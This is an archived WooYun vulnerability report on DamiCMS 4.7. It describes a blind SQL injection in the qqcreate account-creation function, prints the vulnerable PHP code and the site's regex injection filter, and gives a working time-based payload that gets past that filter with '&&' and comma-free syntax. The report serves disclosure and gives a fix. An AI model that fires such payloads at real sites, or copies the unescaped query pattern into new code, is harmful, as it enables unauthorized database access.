{"id": 41699, "wybug_id": "wooyun-2014-087947", "wybug_title": "大米CMS最新版SQL盲注4绕过防御", "wybug_corp": "damicms.com", "wybug_author": "xfkxfk", "wybug_date": "2014-12-23 15:22", "wybug_open_date": "2015-03-23 15:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "安全意识不足", "源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-23：\t细节向公众公开  简要描述： 大米CMS最新版4.7，某处绕过防御SQL盲注 详细说明：  大米CMS最新版4.7，2014-12-12更新文件/Web/Lib/Action/MemberAction.class.php：\n//创建帐号function qqcreate(){$data = array_map('strval',$_POST);$data = array_map('remove_xss',$data);if($data['realname']=='' || $data['qid']==''){$this->error('参数错误!');exit();}$t = M('member')->where(\"username='\".$data['realname'].\"'\")->find();if(!$t){$data['username'] = $data['realname'];}else{$data['username'] = (string)time();}$data['userpwd'] = md5(time().rand(0,9999));$uid = M('member')->add($data);$_SESSION['dami_uid'] = $uid;$_SESSION['dami_username'] = $data['username'];$_SESSION['dami_usericon'] = $data['icon'];if(!empty($_REQUEST['lasturl'])){\t\t$this->assign('jumpUrl',urldecode(htmlspecialchars($_REQUEST['lasturl'])));\t}else{$this->assign('jumpUrl',U('Member/main'));}$this->success('绑定成功,正在登陆~');\t}\n注意这里：\n$t = M('member')->where(\"username='\".$data['realname'].\"'\")->find();\n$data = array_map('strval',$_POST);，然后将$data['realname']就直接带入where中而在where中，字符串是不进行处理的，导致sql注入但是全局有php_safe.php进行防御\n$getfilter=\"'|(and|or)\\\\b.+?(>|<|=|in|like)|\\\\/\\\\*.+?\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\";$postfilter=\"\\\\b(and|or)\\\\b.{1,6}?(=|>|<|\\\\bin\\\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\";$cookiefilter=\"\\\\b(and|or)\\\\b.{1,6}?(=|>|<|\\\\bin\\\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\";\n而且经测试，不能使用逗号这里我们可以简单绕过且不使用逗号进行盲注   漏洞证明：  使用不带逗号的语句，使用&&绕过and的检测：\nrealname=222222' %26%26 CASE WHEN(mid((user()) from 1 for 1)=char(114)) THEN sleep(5) ELSE (0) END%23\n无需登录，发送请求：\n\n这里会延迟5秒返回，说明注入成功看看sql执行记录：\n\n具有数据的注入可使用如下漏洞的脚本： WooYun: 大米CMS某处SQL盲注3绕过补丁及防御   修复方案：  不要太相信他人的东西，在该转移的地方加个转义   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2014-12-23 17:09 厂商回复： 过滤不严可能造成信息泄露 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}